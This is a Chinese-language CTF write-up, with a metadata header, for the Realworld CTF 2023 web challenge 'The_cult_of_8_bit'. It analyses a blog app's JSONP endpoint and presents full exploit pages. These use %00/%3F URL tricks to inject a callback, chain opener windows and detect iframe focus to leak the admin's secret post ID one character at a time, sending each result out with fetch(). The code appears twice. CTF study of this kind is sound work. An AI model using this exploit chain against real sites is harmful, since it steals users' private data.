---
title: Realworld CTF 2023 The_cult_of_8_bit 详解
contest: Realworld CTF 2023
year: 2023
difficulty: hard
vuln_type: xss
tags:
- jsonp
- same-origin-method-execution
- iframe-focus
- post-id-leak
- csrf
- char-by-char-extract
- opensearch-opener
attack_chain:
- '博客系统: /login /register /report /post / 五个路由'
- admin 用户密码 sha256(ADMIN_PASSWORD || "password") + Object.freeze
- '初始 flag post: crypto.randomUUID() 作 id, body=FLAG env'
- admin 不可创建 todo (Nice try redirect)
- '漏洞 1: XSS todo 注入 - new URL(text) 检测 + javascript: 黑名单'
- '漏洞 2: JSONP callback 跨域调用 load_post({success, name, body})'
- '漏洞 3: URLSearchParams.get(''id'') 不 url-decode → null byte 注入'
- '攻击: %00 截断 + %3F 替换 ? + callback=alert%23'
- '完整链: post/?id=UUID%3Fcallback=alert%23%00 → innerHTML 渲染 callback'
- admin 通过 report URL 访问 → callback 触发 → opener 跨窗口调用
- '技巧: opener.opener.document.body...text[i] 逐字符提取 post id'
- 'iframe focus 监听: charList="0123456789abcdef-" + createIframe(name)'
- document.activeElement.name 获焦点 iframe name → 还原 36 字符 UUID
- feature policy allow="sync-xhr 'none'" 阻止 sync-xhr
- '完整利用: open /b.html + location=/(admin home) + listenFocus + exploit 36 次'
- '36 次循环: for i=0..35 { challenge.location = /post/?id=...%3Fcallback=...+text[i]+.focus }'
key_payload: opener[opener.opener.document.body.children[1].childNodes[1].children[0].children[0].children[3].children[0].children[0].children[0].text[${i}]].focus
one_liner: Realworld CTF 2023 The_cult_of_8_bit：JSONP callback + URL %00 截断 + opener opener 跨窗口访问 admin home + iframe focus 监听逐字符提取 UUID 拿到 flag post。
lesson: JSONP + URLSearchParams.get 不解码是 web 高阶绕过；opener.opener 跨窗口读取同源页面内容是经典 XSS 提权；iframe name + focus + activeElement 是逐字符提取 UUID 的盲注技巧。
quality: high
full_path: Realworld_CTF_2023_The_cult_of_8_bit详解.full.md
meta_path: Realworld_CTF_2023_The_cult_of_8_bit详解.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 'Realworld CTF 2023 The_cult_of_8_bit 详解。Realworld CTF 2023 The_cult_of_8_bit：JSONP callback + URL %00 截断 + opener opener 跨窗口访问 admin home + iframe focus 监听逐字符提取 UUID 拿到 flag post。。关键路径：博客系统: /login...'
category: web
subcategory: xss
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/107619.html
reasoning_chain:
- 博客系统 /login /register /report /post → 触发点：admin 密码 sha256(ADMIN_PASSWORD+'password') + Object.freeze
- 初始 flag post：crypto.randomUUID() 作 id, body=FLAG env → 假设：拿 admin 权限读 post
- 'admin 不可创建 todo (Nice try redirect) → 漏洞 1：XSS todo 注入 URL(text) + javascript: 黑名单'
- 漏洞 2：JSONP callback 跨域调用 load_post({success,name,body}) → 假设：callback 可控
- 漏洞 3：URLSearchParams.get('id') 不 url-decode → null byte 注入
- 攻击：%00 截断 + %3F 替换 ? + callback=alert%23 → post/?id=UUID%3Fcallback=alert%23%00 → innerHTML 渲染
- admin 经 report URL 访问 → callback 触发 → opener.opener 跨窗口调用 → text[i] 逐字符提取 post id
- iframe focus 监听：charList='0123456789abcdef-' + createIframe(name) → document.activeElement.name 还原 UUID
- feature policy allow='sync-xhr none' 阻止 sync-xhr → 完整利用 36 次循环爆破
failed_attempts:
- 试图覆盖 admin password hash → 失败：Object.freeze
- 试图直接 sync-xhr → 失败：feature policy 阻止
- 试图覆盖 admin JWT → 失败：必须经 XSS + opener 链
key_observations:
- JSONP + URLSearchParams.get 不解码是 web 高阶绕过
- opener.opener 跨窗口读取同源页面内容是经典 XSS 提权
- iframe name + focus + activeElement 是逐字符提取 UUID 的盲注技巧
- feature policy sync-xhr none 是反 sync-xhr 防御
- Same Origin Method Execution 是 JSONP 攻击理论核心
prerequisites:
- JSONP + Same Origin Method Execution
- URLSearchParams.get url-decode 行为
- opener/opener 跨窗口对象访问
- iframe focus + activeElement 监听
---
# Realworld CTF 2023 The_cult_of_8_bit详解

> 原文: https://www.ctfiot.com/107619.html
> ID: 107619

一

前言

同源策略（https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy）

jsonp（https://zhuanlan.zhihu.com/p/24390509）

Same Orign Method Execution （同源方法执行）（https://www.blackhat.com/docs/eu-14/materials/eu-14-Hayak-Same-Origin-Method-Execution-Exploiting-A-Callback-For-Same-Origin-Policy-Bypass-wp.pdf）

浏览器的opener 对象（https://developer.mozilla.org/zh-CN/docs/Web/API/Window/opener）

iframe（https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/iframe）

XHR（https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/Using_XMLHttpRequest）

特征策略（https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Permissions_Policy）

二一

提前要了解的一些东西

//将window.location赋值为http://example.com，即重定向跳转到http://example.comlocation = "http://example.com";
//获取到当前页面中name为test的iframe对象let testIframe = window['test'];//或let testIframe = window.frames[0];//获取第0个iframe

<html>  [hack](javascript:
alert('hack')) <script> function load_data(data) { console.log(data['data']); } let callback = new URLSearchParams(window.location.search).get('callback'); let script = document.createElement("script"); script.src = "http://otherSite.com/endpoint?callback=" + callback; document.head.appendChild(script);</script> </html>

load_data({"data":"data"})

// 使用非法字符如中间加入空格，%00等let xhr = new XMLHttpRequest();xhr.open("GET", "https://www.ex ample.com");xhr.send()//在send时报错
// 使用不正确的编码let xhr = new XMLHttpRequest();xhr.open("GET", "https://www.example.com/%00");//在open时就会报错xhr.send()
// 使用无效的端口号let xhr = new XMLHttpRequest();xhr.open("GET", "https://www.example.com:
70000");//在open时就会报错xhr.send()

三

题目分析

app.get("/login/", mw.requiresNoLogin, (req, res) => res.render("login"));app.get("/register/", mw.requiresNoLogin, (req, res) => res.render("register"));
app.get("/report/", mw.requiresLogin, (req, res) => res.render("report"));app.get("/post/", (req, res) => res.render("post"));app.get("/", (req, res) => res.render("home"));

(() => { let flagId = crypto.randomUUID(); console.log(`flag post ID: ${flagId}`);
 posts.set(flagId, { name: "Flag", body: process.env.FLAG || "flag{test_flag}" });
 users.set("admin", Object.freeze({ user: "admin", pass: sha256(process.env.ADMIN_PASSWORD || "password"), posts: Object.freeze([flagId]), todos: Object.freeze([]) }));

router.post("/create/todo", [mw.csrfProtection, mw.requiresLogin], (req, res) => { let { text } = req.body;
 if (!text) { return res.redirect("/?msg=Missing text"); }
 if (typeof text !== "string") { return res.redirect("/?msg=Missing text"); }
 let isURL = false; try { new URL(text); // errors if not valid URL isURL = !text.toLowerCase().trim().startsWith("javascript:"); // no } catch {}
 req.user.todos.push({ text, isURL });
 res.redirect("/");});

<%_ user.todos.forEach(todo => { _%><%_ if (todo.isURL) { _%><li class="has-text-left"><a target="_blank" href=<%= todo.text %>><%= todo.text %></a></li><%_ } else { _%><li class="has-text-left"><%= todo.text %></li><%_ } _%><%_ }); _%>

http://a? onfocus=alert(123) id=x

// Don't allow admin to make new posts / todosrouter.use((req, res, next) => { if (req.user.user === "admin") { return res.redirect("/?msg=Nice try"); } next();});

window.onload = function() { const id = new URLSearchParams(window.location.search).get('id'); if (!id) { return; }
 // Load post from POST_SERVER // Since POST_SERVER might be a different origin, this also supports loading data through JSONP const request = new XMLHttpRequest(); try { request.open('GET', POST_SERVER + `/api/post/` + encodeURIComponent(id), false); request.send(null); } catch (err) { // POST_SERVER is on another origin, so let's use JSONP let script = document.createElement("script"); script.src = `${POST_SERVER}/api/post/${id}?callback=load_post`; document.head.appendChild(script); return; }
 load_post(JSON.parse(request.responseText));}

router.get("/post/:id", (req, res) => { let { id } = req.params;
 if (!id || typeof id !== "string") { return res.jsonp({ success: false, error: "Missing id" }); }
 if (!db.posts.has(id)) { return res.jsonp({ success: false, error: "No post found with that id" }); }
 let post = db.posts.get(id); return res.jsonp({ success: true, name: post.name, body: post.body });});

http://localhost:
12345/post/?id=22121be0-5a1f-4cd7-be2d-be073a0cac22%00

const id = new URLSearchParams(window.location.search).get('id');

22121be0-5a1f-4cd7-be2d-be073a0cac22x00

/api/post/22121be0-5a1f-4cd7-be2d-be073a0cac22%00

http://localhost:
12345/post/?id=22121be0-5a1f-4cd7-be2d-be073a0cac22%3Fcallback=alert%23%00

http://localhost:
12345/post/?id=22121be0-5a1f-4cd7-be2d-be073a0cac22%3Fcallback=alert%23

<html>  <script> var iframe = document.createElement('iframe'); iframe.src = "http://localhost:
12345/post/?id=22121be0-5a1f-4cd7-be2d-be073a0cac22%3Fcallback=alert%23"; iframe.allow = "sync-xhr 'none'"; document.body.appendChild(iframe);</script> </html>

四

题解

<script> open("/b.html");//打开b.html location="http://localhost:
12345/";//重定向到admin的主页面（含有post id）</script>

[default](#)<!--默认聚焦点--><script> //生成对应的iframe //post id是uuid，范围是 0-9 a-f 和 - var charList = "0123456789abcdef-";//注意把数字放前面，应为window['4']和window[4]是一样的 var resId = "";
 charList.split('').forEach(name => createIframe(name));
 function createIframe(name) {
 let tmpIframe = document.createElement('iframe'); tmpIframe.name = name;//为iframe设置name属性 document.body.appendChild(tmpIframe); }
 //监听焦点变化 function listenFocus() {
 let activeFocusName = document.activeElement.name; if(activeFocusName) {//若监听到iframe焦点 resId += activeFocusName; document.getElementById("default").focus();//初始化焦点 fetch(`/res/${resId}`); } }
 setInterval(listenFocus, 100);
 open("/c.html");</script>

<script> open("/d.html"); //执行回调函数的页面 location="http://localhost:
12345/"</script>

<script> const selfPostId = "6202f8a2-463d-4754-9675-eecde65b619c";//自己页面随便给个postid var host = "http://localhost:
12345";
 async function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
 async function main() {
 for(let i = 0; i < 36; i++) { let payload = `opener[opener.opener.document.body.children[1].childNodes[1].children[0].children[0].children[3].children[0].children[0].children[0].text[${i}]].focus`; opener.location = `${host}/post/?id=${selfPostId}?callback=${payload}%23%00`; await sleep(200);//时间根据情况调整 } } setTimeout(main, 500);//等待所有页面加载完整后启动主程序</script>

<script> open('/exp.html'); location = 'http://localhost:
12345/';</script>

[default](#)<script> async function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); } const selfId = "0780dd9c-e326-4786-ad80-e0e9d032cb4a";//自己给个存在的post id const host = "http://localhost:
12345";//题目地址 const charList = "0123456789abcdef-"; var resId = "";
 function createCharIframe(name) { var tmpIframe = document.createElement('iframe'); tmpIframe.name = name; document.body.appendChild(tmpIframe); } charList.split('').forEach(name => createCharIframe(name));
 (function createChallengeIframe() { var challengeIframe = document.createElement('iframe'); challengeIframe.name = "challenge"; challengeIframe.src = host; challengeIframe.allow = "sync-xhr 'none'";//使用特征策略禁止xhr document.body.appendChild(challengeIframe); })();
 async function exploit() {
 var challenge = window['challenge']; for(let i = 0; i < 36; i++) { //payload let payload = `top[top.opener.document.body.children[1].childNodes[1].children[0].children[0].children[3].children[0].children[0].children[0].text[${i}]].focus`; challenge.location = `${host}/post/?id=${selfId}%3Fcallback=${payload}%23`; await sleep(200);//时间根据情况调整 } }
 //监听焦点变化 function listenFocus() {
 var activeFocusName = document.activeElement.name; if(activeFocusName) {//若监听到iframe焦点 resId += activeFocusName; document.getElementById("default").focus();//初始化焦点 fetch(`/res/${resId}`); } } setInterval(listenFocus, 100); sleep(2000); exploit();</script>

https://sh1yo.art/ctf/thecultof8bit/

https://blog.maple3142.net/2023/01/08/real-world-ctf-2023-writeups/#the-cult-of-8-bit

https://www.blackhat.com/docs/eu-14/materials/eu-14-Hayak-Same-Origin-Method-Execution-Exploiting-A-Callback-For-Same-Origin-Policy-Bypass-wp.pdf

https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy

https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Permissions_Policy

https://developer.mozilla.org/zh-CN/docs/Web/API/Window/opener

https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/iframe

https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest/Using_XMLHttpRequest

看雪ID：pank1s

https://bbs.kanxue.com/user-home-952339.htm

*本文由看雪论坛 pank1s 原创，转载请注明来自看雪社区

# 往期推荐

1、在 Windows下搭建LLVM 使用环境

2、深入学习smali语法

3、安卓加固脱壳分享

4、Flutter 逆向初探

5、一个简单实践理解栈空间转移

6、记一次某盾手游加固的脱壳与修复

球分享

球点赞

球在看

点击“阅读原文”，了解更多！


```
一
前言
二一
提前要了解的一些东西
//将window.location赋值为http://example.com，即重定向跳转到http://example.comlocation = "http://example.com";
//获取到当前页面中name为test的iframe对象let testIframe = window['test'];//或let testIframe = window.frames[0];//获取第0个iframe
<html>  [hack](javascript:
alert('hack')) <script> function load_data(data) { console.log(data['data']); } let callback = new URLSearchParams(window.location.search).get('callback'); let script = document.createElement("script"); script.src = "http://otherSite.com/endpoint?callback=" + callback; document.head.appendChild(script);</script> </html>
load_data({"data":"data"})
// 使用非法字符如中间加入空格，%00等let xhr = new XMLHttpRequest();xhr.open("GET", "https://www.ex ample.com");xhr.send()//在send时报错
// 使用不正确的编码let xhr = new XMLHttpRequest();xhr.open("GET", "https://www.example.com/%00");//在open时就会报错xhr.send()
// 使用无效的端口号let xhr = new XMLHttpRequest();xhr.open("GET", "https://www.example.com:
70000");//在open时就会报错xhr.send()
三
题目分析
app.get("/login/", mw.requiresNoLogin, (req, res) => res.render("login"));app.get("/register/", mw.requiresNoLogin, (req, res) => res.render("register"));
app.get("/report/", mw.requiresLogin, (req, res) => res.render("report"));app.get("/post/", (req, res) => res.render("post"));app.get("/", (req, res) => res.render("home"));
(() => { let flagId = crypto.randomUUID(); console.log(`flag post ID: ${flagId}`);
 posts.set(flagId, { name: "Flag", body: process.env.FLAG || "flag{test_flag}" });
 users.set("admin", Object.freeze({ user: "admin", pass: sha256(process.env.ADMIN_PASSWORD || "password"), posts: Object.freeze([flagId]), todos: Object.freeze([]) }));
router.post("/create/todo", [mw.csrfProtection, mw.requiresLogin], (req, res) => { let { text } = req.body;
 if (!text) { return res.redirect("/?msg=Missing text"); }
 if (typeof text !== "string") { return res.redirect("/?msg=Missing text"); }
 let isURL = false; try { new URL(text); // errors if not valid URL isURL = !text.toLowerCase().trim().startsWith("javascript:"); // no } catch {}
 req.user.todos.push({ text, isURL });
 res.redirect("/");});
<%_ user.todos.forEach(todo => { _%><%_ if (todo.isURL) { _%><li class="has-text-left"><a target="_blank" href=<%= todo.text %>><%= todo.text %></a></li><%_ } else { _%><li class="has-text-left"><%= todo.text %></li><%_ } _%><%_ }); _%>
http://a? onfocus=alert(123) id=x
// Don't allow admin to make new posts / todosrouter.use((req, res, next) => { if (req.user.user === "admin") { return res.redirect("/?msg=Nice try"); } next();});
window.onload = function() { const id = new URLSearchParams(window.location.search).get('id'); if (!id) { return; }
 // Load post from POST_SERVER // Since POST_SERVER might be a different origin, this also supports loading data through JSONP const request = new XMLHttpRequest(); try { request.open('GET', POST_SERVER + `/api/post/` + encodeURIComponent(id), false); request.send(null); } catch (err) { // POST_SERVER is on another origin, so let's use JSONP let script = document.createElement("script"); script.src = `${POST_SERVER}/api/post/${id}?callback=load_post`; document.head.appendChild(script); return; }
 load_post(JSON.parse(request.responseText));}
router.get("/post/:id", (req, res) => { let { id } = req.params;
 if (!id || typeof id !== "string") { return res.jsonp({ success: false, error: "Missing id" }); }
 if (!db.posts.has(id)) { return res.jsonp({ success: false, error: "No post found with that id" }); }
 let post = db.posts.get(id); return res.jsonp({ success: true, name: post.name, body: post.body });});
http://localhost:
12345/post/?id=22121be0-5a1f-4cd7-be2d-be073a0cac22%00
const id = new URLSearchParams(window.location.search).get('id');
22121be0-5a1f-4cd7-be2d-be073a0cac22x00
/api/post/22121be0-5a1f-4cd7-be2d-be073a0cac22%00
http://localhost:
12345/post/?id=22121be0-5a1f-4cd7-be2d-be073a0cac22%3Fcallback=alert%23%00
http://localhost:
12345/post/?id=22121be0-5a1f-4cd7-be2d-be073a0cac22%3Fcallback=alert%23
<html>  <script> var iframe = document.createElement('iframe'); iframe.src = "http://localhost:
12345/post/?id=22121be0-5a1f-4cd7-be2d-be073a0cac22%3Fcallback=alert%23"; iframe.allow = "sync-xhr 'none'"; document.body.appendChild(iframe);</script> </html>
四
题解
<script> open("/b.html");//打开b.html location="http://localhost:
12345/";//重定向到admin的主页面（含有post id）</script>
[default](#)<!--默认聚焦点--><script> //生成对应的iframe //post id是uuid，范围是 0-9 a-f 和 - var charList = "0123456789abcdef-";//注意把数字放前面，应为window['4']和window[4]是一样的 var resId = "";
 charList.split('').forEach(name => createIframe(name));
 function createIframe(name) {
 let tmpIframe = document.createElement('iframe'); tmpIframe.name = name;//为iframe设置name属性 document.body.appendChild(tmpIframe); }
 //监听焦点变化 function listenFocus() {
 let activeFocusName = document.activeElement.name; if(activeFocusName) {//若监听到iframe焦点 resId += activeFocusName; document.getElementById("default").focus();//初始化焦点 fetch(`/res/${resId}`); } }
 setInterval(listenFocus, 100);
 open("/c.html");</script>
<script> open("/d.html"); //执行回调函数的页面 location="http://localhost:
12345/"</script>
<script> const selfPostId = "6202f8a2-463d-4754-9675-eecde65b619c";//自己页面随便给个postid var host = "http://localhost:
12345";
 async function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
 async function main() {
 for(let i = 0; i < 36; i++) { let payload = `opener[opener.opener.document.body.children[1].childNodes[1].children[0].children[0].children[3].children[0].children[0].children[0].text[${i}]].focus`; opener.location = `${host}/post/?id=${selfPostId}?callback=${payload}%23%00`; await sleep(200);//时间根据情况调整 } } setTimeout(main, 500);//等待所有页面加载完整后启动主程序</script>
<script> open('/exp.html'); location = 'http://localhost:
12345/';</script>
[default](#)<script> async function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); } const selfId = "0780dd9c-e326-4786-ad80-e0e9d032cb4a";//自己给个存在的post id const host = "http://localhost:
12345";//题目地址 const charList = "0123456789abcdef-"; var resId = "";
 function createCharIframe(name) { var tmpIframe = document.createElement('iframe'); tmpIframe.name = name; document.body.appendChild(tmpIframe); } charList.split('').forEach(name => createCharIframe(name));
 (function createChallengeIframe() { var challengeIframe = document.createElement('iframe'); challengeIframe.name = "challenge"; challengeIframe.src = host; challengeIframe.allow = "sync-xhr 'none'";//使用特征策略禁止xhr document.body.appendChild(challengeIframe); })();
 async function exploit() {
 var challenge = window['challenge']; for(let i = 0; i < 36; i++) { //payload let payload = `top[top.opener.document.body.children[1].childNodes[1].children[0].children[0].children[3].children[0].children[0].children[0].text[${i}]].focus`; challenge.location = `${host}/post/?id=${selfId}%3Fcallback=${payload}%23`; await sleep(200);//时间根据情况调整 } }
 //监听焦点变化 function listenFocus() {
 var activeFocusName = document.activeElement.name; if(activeFocusName) {//若监听到iframe焦点 resId += activeFocusName; document.getElementById("default").focus();//初始化焦点 fetch(`/res/${resId}`); } } setInterval(listenFocus, 100); sleep(2000); exploit();</script>
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]